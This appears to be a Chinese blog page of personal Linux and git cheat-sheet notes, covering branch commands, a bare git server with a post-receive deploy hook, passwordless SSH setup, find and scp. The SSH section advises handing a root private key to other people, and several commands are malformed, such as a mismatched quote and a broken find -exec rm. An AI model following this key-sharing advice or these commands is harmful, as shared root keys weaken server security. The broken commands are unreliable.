class="line">alvin    pts/<span class="number">0</span>        <span class="number">223.104</span>.***.**   Thu Nov <span class="number">29</span> <span class="number">06</span>:<span class="number">46</span> - <span class="number">07</span>:<span class="number">00</span>  (<span class="number">00</span>:<span class="number">14</span>)</span><br><span class="line">alvin    pts/<span class="number">0</span>        <span class="number">223.104</span>.***.**   Wed Nov <span class="number">28</span> <span class="number">20</span>:<span class="number">45</span> - <span class="number">22</span>:<span class="number">27</span>  (<span class="number">01</span>:<span class="number">42</span>)</span><br><span class="line">[alvin@VM_0_16_centos ~]$ sudo pkill -kill -t pts/<span class="number">3</span></span><br><span class="line">#harry用户已经被踢除了</span><br><span class="line">[alvin@VM_0_16_centos ~]$ w</span><br><span class="line"> <span class="number">17</span>:<span class="number">04</span>:<span class="number">37</span> up <span class="number">29</span> days,  <span class="number">6</span>:<span class="number">44</span>,  <span class="number">5</span> users,  load average: <span class="number">0.00</span>, <span class="number">0.01</span>, <span class="number">0.05</span></span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">alvin    pts/<span class="number">0</span>    <span class="number">116.199</span><span class="number">.102</span><span class="number">.65</span>   <span class="number">07</span>:<span class="number">25</span>    <span class="number">5.00</span>s  <span class="number">0.12</span>s  <span class="number">0.00</span>s w</span><br><span class="line">root     pts/<span class="number">1</span>    <span class="number">116.199</span><span class="number">.102</span><span class="number">.65</span>   <span class="number">11</span>:<span class="number">05</span>    <span class="number">5</span>:<span class="number">59</span>m  <span class="number">0.02</span>s  <span class="number">0.02</span>s -bash</span><br><span class="line">alvin    pts/<span class="number">2</span>    <span class="number">116.199</span><span class="number">.102</span><span class="number">.65</span>   <span class="number">11</span>:<span class="number">05</span>    <span class="number">5</span>:<span class="number">59</span>m  <span class="number">0.04</span>s  <span class="number">0.05</span>s sshd: alvin [priv]</span><br><span class="line">kate     pts/<span class="number">4</span>    <span class="number">116.199</span><span class="number">.102</span><span class="number">.65</span>   <span class="number">11</span>:<span class="number">08</span>    <span class="number">5</span>:<span class="number">12</span>m <span class="number">11.94</span>s <span class="number">11.91</span>s top</span><br><span class="line">alvin    pts/<span class="number">5</span>    <span class="number">116.199</span><span class="number">.102</span><span class="number">.65</span>   <span class="number">11</span>:<span class="number">53</span>    <span class="number">5</span>:<span class="number">10</span>m  <span class="number">0.02</span>s  <span class="number">0.02</span>s -bash</span><br></pre></td></tr></table></figure>
<h3 id="回到远程仓库的状态"><a href="#回到远程仓库的状态" class="headerlink" title="回到远程仓库的状态"></a>回到远程仓库的状态</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch --all &amp;&amp; git reset --hard origin/master</span><br></pre></td></tr></table></figure>
<h3 id="重设第一个commit"><a href="#重设第一个commit" class="headerlink" title="重设第一个commit"></a>重设第一个commit</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git update-ref -d HEAD</span><br></pre></td></tr></table></figure>
<h3 id="删除已经合并到master的分支"><a href="#删除已经合并到master的分支" class="headerlink" title="删除已经合并到master的分支"></a>删除已经合并到master的分支</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --merged master | grep -v <span class="string">'^\*\|  master'</span> | xargs -n <span class="number">1</span> git branch -d</span><br></pre></td></tr></table></figure>
<h3 id="展示本地分支关联远程仓库的情况"><a href="#展示本地分支关联远程仓库的情况" class="headerlink" title="展示本地分支关联远程仓库的情况"></a>展示本地分支关联远程仓库的情况</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git branch -vv</span><br><span class="line">ai_notice      <span class="number">6</span>fa631e7 Merge branch <span class="string">'master'</span> into ai_notice</span><br><span class="line">  delete_msg     <span class="number">33</span>fc3808 Merge branch <span class="string">'master'</span> into delete_msg</span><br></pre></td></tr></table></figure>
<h3 id="关联远程分支"><a href="#关联远程分支" class="headerlink" title="关联远程分支"></a>关联远程分支</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch -u origin/mybranch</span><br><span class="line">git push origin/mybranch -u</span><br></pre></td></tr></table></figure>
<h3 id="列出所有远程分支"><a href="#列出所有远程分支" class="headerlink" title="列出所有远程分支"></a>列出所有远程分支</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -r</span><br></pre></td></tr></table></figure>
<h3 id="列出本地和远程分支"><a href="#列出本地和远程分支" class="headerlink" title="列出本地和远程分支"></a>列出本地和远程分支</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -a</span><br></pre></td></tr></table></figure>
<h3 id="从远程分支中创建并切换到本地分支"><a href="#从远程分支中创建并切换到本地分支" class="headerlink" title="从远程分支中创建并切换到本地分支"></a>从远程分支中创建并切换到本地分支</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b &lt;branch-name&gt; origin/&lt;branch-name&gt;</span><br></pre></td></tr></table></figure>
<h3 id="删除远程分支"><a href="#删除远程分支" class="headerlink" title="删除远程分支"></a>删除远程分支</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git push origin --<span class="keyword">delete</span> &lt;remote-branchname&gt;</span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">git push origin :&lt;remote-branchname&gt;</span><br></pre></td></tr></table></figure>
<h3 id="重命名本地分支"><a href="#重命名本地分支" class="headerlink" title="重命名本地分支"></a>重命名本地分支</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -m &lt;<span class="keyword">new</span>-branch-name&gt;</span><br></pre></td></tr></table></figure>
<h3 id="切回到某个标签"><a href="#切回到某个标签" class="headerlink" title="切回到某个标签"></a>切回到某个标签</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b branch_name tag_name</span><br></pre></td></tr></table></figure>
<h3 id="放弃工作区的修改"><a href="#放弃工作区的修改" class="headerlink" title="放弃工作区的修改"></a>放弃工作区的修改</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout &lt;file-name&gt;</span><br><span class="line">放弃所有修改：</span><br><span class="line"></span><br><span class="line">git checkout .</span><br></pre></td></tr></table></figure>
<h3 id="修改远程仓库的url"><a href="#修改远程仓库的url" class="headerlink" title="修改远程仓库的url"></a>修改远程仓库的url</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote set-url origin &lt;URL&gt;</span><br></pre></td></tr></table></figure>
<h3 id="查看两个星期内的改动"><a href="#查看两个星期内的改动" class="headerlink" title="查看两个星期内的改动"></a>查看两个星期内的改动</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git whatchanged --since=<span class="string">'2 weeks ago'</span></span><br></pre></td></tr></table></figure>
<h3 id="展示简化的commit历史"><a href="#展示简化的commit历史" class="headerlink" title="展示简化的commit历史"></a>展示简化的commit历史</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --pretty=oneline --graph --decorate --all</span><br></pre></td></tr></table></figure>
<h3 id="展示任意分支某一文件的内容"><a href="#展示任意分支某一文件的内容" class="headerlink" title="展示任意分支某一文件的内容"></a>展示任意分支某一文件的内容</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show &lt;branch-name&gt;:&lt;file-name&gt;</span><br></pre></td></tr></table></figure>
<h3 id="clone下来指定的单一分支"><a href="#clone下来指定的单一分支" class="headerlink" title="clone下来指定的单一分支"></a>clone下来指定的单一分支</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b &lt;branch-name&gt; --single-branch https:<span class="comment">//github.com/user/repo.git</span></span><br></pre></td></tr></table></figure>
<h3 id="忽略某个文件的改动"><a href="#忽略某个文件的改动" class="headerlink" title="忽略某个文件的改动"></a>忽略某个文件的改动</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">关闭 track 指定文件的改动，也就是 Git 将不会在记录这个文件的改动</span><br><span class="line"></span><br><span class="line">git update-index --assume-unchanged path/to/file</span><br><span class="line">恢复 track 指定文件的改动</span><br><span class="line"></span><br><span class="line">git update-index --no-assume-unchanged path/to/file</span><br></pre></td></tr></table></figure>
<h3 id="在commit-log中查找相关内容"><a href="#在commit-log中查找相关内容" class="headerlink" title="在commit log中查找相关内容"></a>在commit log中查找相关内容</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --all --grep=<span class="string">'&lt;given-text&gt;'</span></span><br></pre></td></tr></table></figure>
<h3 id="搭建Git服务器"><a href="#搭建Git服务器" class="headerlink" title="搭建Git服务器"></a>搭建Git服务器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//coffeephp.com/articles/3</span></span><br><span class="line">$ sudo yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel perl-devel</span><br><span class="line">$ sudo yum install git</span><br><span class="line">$ sudo adduser git</span><br><span class="line">$ cd /home/git</span><br><span class="line">$ mkdir .ssh &amp;&amp; chmod <span class="number">700</span> .ssh</span><br><span class="line">$ touch .ssh/authorized_keys &amp;&amp; chmod <span class="number">600</span> .ssh/authorized_keys</span><br><span class="line">$ sudo chown -R git:git .ssh</span><br><span class="line"></span><br><span class="line">客户端上生成密钥#</span><br><span class="line"></span><br><span class="line">$ cd ~</span><br><span class="line">$ ssh-keygen -t rsa</span><br><span class="line"> $ scp ~<span class="regexp">/.ssh/i</span>d_rsa.pub root@server_ip:<span class="regexp">/home/gi</span>t/.ssh/authorized_keys</span><br><span class="line"> </span><br><span class="line"> $ mkdir /home/git/repo/</span><br><span class="line"> $ sudo chown git:git /home/git/repo/</span><br><span class="line"> $ cd /home/git/repo/</span><br><span class="line"> $ sudo git init --bare sample.git</span><br><span class="line"> $ sudo chown -R git:git sample.git</span><br><span class="line"> </span><br><span class="line"> $ git clone git@<span class="number">118.24</span><span class="number">.158</span><span class="number">.116</span>/:<span class="regexp">/home/gi</span>t/repo/sample.git sample </span><br><span class="line"> $cd sample</span><br><span class="line"> $ touch index.html</span><br><span class="line"> $ git add index.html</span><br><span class="line"> $ git commit index.html -m <span class="string">'first commit'</span></span><br><span class="line"> $ git push origin master</span><br><span class="line"> Enumerating objects: <span class="number">3</span>, done.</span><br><span class="line"> Counting objects: <span class="number">100</span>% (<span class="number">3</span>/<span class="number">3</span>), done.</span><br><span class="line"> Writing objects: <span class="number">100</span>% (<span class="number">3</span>/<span class="number">3</span>), <span class="number">209</span> bytes | <span class="number">209.00</span> KiB/s, done.</span><br><span class="line"> Total <span class="number">3</span> (delta <span class="number">0</span>), reused <span class="number">0</span> (delta <span class="number">0</span>)</span><br><span class="line"> To <span class="number">118.24</span><span class="number">.158</span><span class="number">.116</span>:<span class="regexp">/home/gi</span>t/repo/sample.git</span><br><span class="line">  * [<span class="keyword">new</span> branch]      master -&gt; master</span><br><span class="line">创建网站的目录#</span><br><span class="line"></span><br><span class="line">$ sudo mkdir /<span class="keyword">var</span>/www/sample -p</span><br><span class="line">$ sudo chown -R git:git /<span class="keyword">var</span>/www/sample</span><br><span class="line"></span><br><span class="line">设置git钩子#</span><br><span class="line"></span><br><span class="line">$ cd /home/git/repo/sample.git/hooks</span><br><span class="line">$ sudo vim post-receive</span><br><span class="line"></span><br><span class="line">写入以下内容：</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">GIT_WORK_TREE=<span class="regexp">/var/</span>www/sample git checkout -f</span><br><span class="line"></span><br><span class="line">写入权限</span><br><span class="line"></span><br><span class="line">$ sudo chmod +x post-receive</span><br><span class="line"></span><br><span class="line">[root@VM_0_14_centos hooks]# ll /var/www/sample/</span><br><span class="line">total <span class="number">4</span></span><br><span class="line">-rw-rw-r-- <span class="number">1</span> git git <span class="number">5</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">23</span> index.html</span><br><span class="line"></span><br><span class="line">$ ssh git@<span class="number">118.24</span><span class="number">.158</span><span class="number">.116</span></span><br><span class="line">Last failed login: Wed Jan  <span class="number">9</span> <span class="number">09</span>:<span class="number">38</span>:<span class="number">59</span> CST <span class="number">2019</span> <span class="keyword">from</span> <span class="number">219.246</span><span class="number">.78</span><span class="number">.17</span> on ssh:notty</span><br><span class="line">There were <span class="number">264</span> failed login attempts since the last successful login.</span><br><span class="line">[git@VM_0_14_centos ~]$ ll</span><br><span class="line">total <span class="number">4</span></span><br><span class="line">drwxr-xr-x <span class="number">3</span> git git <span class="number">4096</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">16</span> repo</span><br><span class="line">[git@VM_0_14_centos ~]$ ll repo/</span><br><span class="line">total <span class="number">4</span></span><br><span class="line">drwxr-xr-x <span class="number">7</span> git git <span class="number">4096</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">23</span> sample.git</span><br><span class="line">[git@VM_0_14_centos ~]$ ll repo/sample.git/</span><br><span class="line">total <span class="number">36</span></span><br><span class="line">drwxr-xr-x  <span class="number">2</span> git git <span class="number">4096</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">16</span> branches</span><br><span class="line">-rw-r--r--  <span class="number">1</span> git git   <span class="number">66</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">16</span> config</span><br><span class="line">-rw-r--r--  <span class="number">1</span> git git   <span class="number">73</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">16</span> description</span><br><span class="line">-rw-r--r--  <span class="number">1</span> git git   <span class="number">23</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">16</span> HEAD</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> git git <span class="number">4096</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">21</span> hooks</span><br><span class="line">-rw-rw-r--  <span class="number">1</span> git git  <span class="number">112</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">23</span> index</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> git git <span class="number">4096</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">16</span> info</span><br><span class="line">drwxr-xr-x <span class="number">10</span> git git <span class="number">4096</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">23</span> objects</span><br><span class="line">drwxr-xr-x  <span class="number">4</span> git git <span class="number">4096</span> Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">16</span> refs</span><br><span class="line"></span><br><span class="line">[root@VM_0_14_centos hooks]# cat /etc/shells</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/sbin/nologin</span><br><span class="line">/usr/bin/sh</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/usr/sbin/nologin</span><br><span class="line">/bin/tcsh</span><br><span class="line">/bin/csh</span><br><span class="line">/usr/bin/fish</span><br><span class="line">$ which git-shell   # make sure git-shell is installed on your system.</span><br><span class="line">/usr/bin/git-shell</span><br><span class="line">$ sudo vim /etc/shells  # and add the path to git-shell from last command</span><br><span class="line"></span><br><span class="line">使用 chsh 命令修改任一系统用户的 shell</span><br><span class="line"></span><br><span class="line">$ sudo chsh git  # and enter the path to git-shell, usually: /usr/bin/git-shell</span><br><span class="line">Changing shell <span class="keyword">for</span> git.</span><br><span class="line">New shell [<span class="regexp">/bin/</span>bash]: <span class="regexp">/usr/</span>bin/git-shell</span><br><span class="line">Shell changed.</span><br><span class="line">这样，用户 git 就只能利用 SSH 连接对 Git 仓库进行推送和拉取操作，而不能登录机器并取得普通 shell。 如果试图登录，你会发现尝试被拒绝，像这样：</span><br><span class="line"></span><br><span class="line">$ ssh git@<span class="number">118.24</span><span class="number">.158</span><span class="number">.116</span></span><br><span class="line">Last login: Wed Jan  <span class="number">9</span> <span class="number">14</span>:<span class="number">29</span>:<span class="number">56</span> <span class="number">2019</span> <span class="keyword">from</span> <span class="number">218.30</span><span class="number">.113</span><span class="number">.34</span></span><br><span class="line">fatal: Interactive git shell is not enabled.</span><br><span class="line">hint: ~<span class="regexp">/git-shell-commands should exist and have read and execute access.</span></span><br><span class="line"><span class="regexp">Connection to 118.24.158.116 closed.</span></span><br></pre></td></tr></table></figure>
<h3 id="查看定时任务日志"><a href="#查看定时任务日志" class="headerlink" title="查看定时任务日志"></a>查看定时任务日志</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">默认位于 /<span class="keyword">var</span>/log/cron 文件：</span><br><span class="line"></span><br><span class="line">tail -f /<span class="keyword">var</span>/log/cron</span><br><span class="line">cat /<span class="keyword">var</span>/log/cron | grep <span class="string">"sh"</span></span><br></pre></td></tr></table></figure>
<h3 id="GitHub-API-limit"><a href="#GitHub-API-limit" class="headerlink" title="GitHub API limit"></a>GitHub API limit</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GitHub API limit (<span class="number">0</span> calls/hr) is exhausted, could not fetch https:<span class="comment">//api.github.com/graphql. Create a GitHub OAuth token to go over the API rate limit. You can also wait until 2019-01-25 09:36:32 for the rate limit to reset.</span></span><br><span class="line"></span><br><span class="line">Head to https:<span class="comment">//github.com/settings/tokens/new?scopes=repo&amp;description=Composer+on+BJ-D-212361A+2019-01-25+0835</span></span><br><span class="line">to retrieve a token. It will be stored <span class="keyword">in</span> <span class="string">"C:/Users/xxx/AppData/Roaming/Composer/auth.json"</span> <span class="keyword">for</span> future use by Composer.</span><br><span class="line">Token (hidden):</span><br></pre></td></tr></table></figure>
<h3 id="在Git中添加忽略文件"><a href="#在Git中添加忽略文件" class="headerlink" title="在Git中添加忽略文件"></a>在Git中添加忽略文件</h3><p>如果文件已经添加到缓存区了<br>// 移除file1<br>git reset HEAD file1<br>// 移除全部<a href="https://blog.tedxiong.com/add_ingore_file_for_git.html" target="_blank" rel="noopener">https://blog.tedxiong.com/add_ingore_file_for_git.html</a><br>git reset HEAD *<br>//如果有多个文件可以使用通配符<br>git rm –cached FILENAME<br>添加忽略文件<br>touch .gitignore<br>echo ‘file1’ &gt;&gt; .gitignore<br>echo ‘build/‘ &gt;&gt; .gitignore<br>配置全局的忽略文件<br>git config –global core.excludesfile ~/.gitignore_global<br>添加例外<br>如果不想跟别人分享.gitignore文件，可以在.git/info/exclude中配置规则。</p>
<h3 id="一键提交脚本"><a href="#一键提交脚本" class="headerlink" title="一键提交脚本"></a>一键提交脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vi push.sh</span><br><span class="line">time=<span class="string">`date "+%Y-%m-%d_%H-%M-%S"`</span></span><br><span class="line">who=<span class="string">`hostname'</span></span><br><span class="line"><span class="string">git add --all</span></span><br><span class="line"><span class="string">git commit -m "<span class="subst">$&#123;who&#125;</span> push @ <span class="subst">$&#123;time&#125;</span>"</span></span><br><span class="line"><span class="string">git push origin master</span></span><br><span class="line"><span class="string">echo "Finished Push"</span></span><br></pre></td></tr></table></figure>
<h3 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">ssh-copy-id -i/Users/USERNAME/.ssh/id_rsa.pub root@ip</span><br><span class="line">touch authorized_keys</span><br><span class="line">chmod <span class="number">600</span> /root/.ssh/authorized_keys</span><br><span class="line">cat /root/.ssh/id_rsa.pub &gt;&gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line">ssh root@ip</span><br><span class="line">如果此时想让其他人也免密登录 可以把本地的id_rsa 文件拷贝给别人 执行命令</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa root@ip </span><br><span class="line"> vim /etc/ssh/sshd_config</span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile %h/.ssh/authorized_keys</span><br><span class="line">PasswordAuthentication no #修改之前一定要确认你的秘钥可以正常使用</span><br><span class="line">重启ssh配置生效</span><br><span class="line"></span><br><span class="line">service sshd restart</span><br><span class="line">从服务器下载</span><br><span class="line"></span><br><span class="line">[username@host ~]$ cd ~<span class="regexp">/.ssh</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">[username@host ~]$ ssh-keygen /</span><span class="regexp">/ 一路回车</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">[username@host ~]$ cat id_rsa.pub &gt;&gt; authorized_keys</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">[username@host ~]$ chmod 600 authorized_keys</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">[username@host ~]$ chmod 700 ~/</span>.ssh</span><br><span class="line"><span class="comment">// 下载私钥</span></span><br><span class="line"></span><br><span class="line">[local@host ~]$ sudo scp -i USERNAME@HOST /usr/USERNAME/.ssh/id_rsa /LOCAL_PATH/id_rsa</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试秘钥登录</span></span><br><span class="line"></span><br><span class="line">sudo ssh USERNAME@HOST -i /LOCAL_PATH/id_rsa</span><br></pre></td></tr></table></figure>
<h3 id="最近24小时修改过的文件"><a href="#最近24小时修改过的文件" class="headerlink" title="最近24小时修改过的文件"></a>最近24小时修改过的文件</h3><p>find / -mtime -1</p>
<h3 id="修改-hostname"><a href="#修改-hostname" class="headerlink" title="修改 hostname"></a>修改 hostname</h3><p>hostname syyong # 临时修改 hostname 为 syyong<br>vi /etc/sysconfig/network –&gt; HOSTNAME = syyong # 永久修改 hostname 为syyong</p>
<h3 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find /etc/ -name httpd.conf # 在 /etc 目录下查找文件名为 httpd.conf</span><br><span class="line">find /etc/ -name http* # 在 /etc目录下以 httpd 开头的文件</span><br><span class="line">find /root/ -size +10M # 在 /root 目录下大于 10M 的文件</span><br><span class="line">find /home/ -user syyong # 在 /home 目录下查找所有者是 syyong</span><br><span class="line">find ./ -user syyong -exec rm -rf&#123;&#125;\ # 在当前目录下把找到所有者是 syyong 的用户的文件删除掉</span><br><span class="line">find /etc -cmin -5 # 在 /etc 目录下查找5分钟内修改过属性的文件和目录</span><br><span class="line">find /etc -size +163840 -a -size -204800 # 在 /etc 目录下查找大于 80M 小于 100M 的文件</span><br><span class="line">find .|xargs grep -ri "lnmp" # 在当前目录下查找含 lnmp 字符的文件</span><br></pre></td></tr></table></figure>
<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 22 syyong@192.168.1.2 # 通过 ssh 通过账号密码登录到 192.168.1.2 服务器</span><br><span class="line">ssh -i ./ssh-key.pem syyong@192.168.1.2 # 通过 ssh 通过证书登录到 192.168.1.2 服务器</span><br></pre></td></tr></table></figure>
<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">scp -p 2202 /home/lnmp.tar.gz www@192.168.1.2:/home/ # 将文件 lnmp.tar.gz 同步到 192.168.1.2 服务器的 /home/ 目录下</span><br><span class="line">rsync -avzP /home/lnmp.tar.gz -e 'ssh -p 2202' www@192.168.1.2:/home/ # 将文件 lnmp.tar.gz 增量同步到 192.168.1.2 服务器的 /home/ 目录下</span><br><span class="line">touch file&#123;1..100&#125; # 批量创建 file1,file2...file100</span><br><span class="line">touch file&#123;a..z&#125; # 批量创建 filea,fileb...filez</span><br><span class="line">touch file&#123;A..Z&#125; # 批量创建 fileA,fileB...fileZ</span><br><span class="line">echo 'lnmp' &gt; lnmp.txt # 覆盖式写入 lnmp 到 lnmp.txt 文件中</span><br><span class="line">echo 'lnmp' &gt;&gt; lnmp.txt # 追加式写入 lnmp 到 lnmp.txt 文件中</span><br><span 